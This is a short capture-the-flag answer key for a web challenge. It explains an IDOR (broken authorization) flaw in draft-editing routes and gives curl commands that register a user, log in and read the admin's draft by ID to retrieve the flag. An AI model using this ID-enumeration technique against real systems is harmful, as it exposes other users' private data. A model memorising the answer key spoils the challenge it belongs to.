# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: IDOR / broken authorization. `/<username>/drafts` and
`/edit_draft/<id>` only require being logged in — they never check the resource
belongs to you (the ownership check is commented out). The admin's draft id 1
contains the flag.

1. **Register and log in** as a normal user (one cookie jar):

   ```
   curl -s -c cookies.txt -X POST http://<target>/register \
     -d "username=raider2&password=raiderpass&confirm_password=raiderpass"
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/login \
     -d "username=raider2&password=raiderpass" -L -o /dev/null
   ```

2. **Read the admin's draft directly** by ID (ownership check disabled):

   ```
   curl -s -b cookies.txt http://<target>/edit_draft/1
   ```

   (You can also list them via `curl -s -b cookies.txt http://<target>/admin/drafts`.)

3. **Extract the flag** (`FLAG{...}`) from the admin draft content and report it
   verbatim.
